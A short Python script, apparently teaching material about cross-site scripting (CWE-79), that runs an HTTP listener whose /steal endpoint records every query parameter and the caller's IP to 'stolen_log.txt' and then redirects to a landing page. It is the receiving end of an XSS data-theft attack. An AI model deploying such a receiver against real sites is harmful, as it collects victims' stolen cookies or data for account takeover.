#!/usr/bin/env python3
# toy_receiver.py
# CWE-79 教学监听器：记录 /steal 请求并返回 landing.html

from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs, unquote_plus
import html, os

PORT = 9000
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
LANDING_PATH = os.path.join(BASE_DIR, "landing.html")

class Handler(BaseHTTPRequestHandler):
    def _log(self, text):
        print(text)

    def do_GET(self):
        remote_ip = self.client_address[0]
        parsed = urlparse(self.path)
        qs = parse_qs(parsed.query)
        path = parsed.path

        # ---------- /steal ----------
        if path == "/steal":
            decoded = {k: [unquote_plus(v) for v in vals] for k, vals in qs.items()}
            self._log("=== /steal 请求 ===")
            self._log(f"From IP: {remote_ip}")
            self._log(f"Query params: {decoded}")

            # 写入日志
            with open("stolen_log.txt", "a", encoding="utf-8") as f:
                f.write(f"IP: {remote_ip} | Path: {self.path} | Params: {decoded}\n")

            # 返回响应并自动跳转
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.end_headers()
            self.wfile.write(b"<p>OK - received</p>")
            self.wfile.write(b'<script>location.href="/landing.html";</script>')
            return

        # ---------- /landing.html ----------
        elif path == "/landing.html":
            try:
                with open(LANDING_PATH, "r", encoding="utf-8") as f:
                    page = f.read()
                # 插入访问者 IP
                page = page.replace("{client_ip}", html.escape(remote_ip))

                self.send_response(200)
                self.send_header("Content-Type", "text/html; charset=utf-8")
                self.end_headers()
                self.wfile.write(page.encode("utf-8"))
            except FileNotFoundError:
                self.send_error(404, "landing.html not found")
            return

        # ---------- 其他路径 ----------
        else:
            self.send_error(404, "Not Found")

if __name__ == "__main__":
    print(f"Starting toy receiver on 0.0.0.0:{PORT}")
    server = HTTPServer(('0.0.0.0', PORT), Handler)
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("Stopping")
        server.server_close()
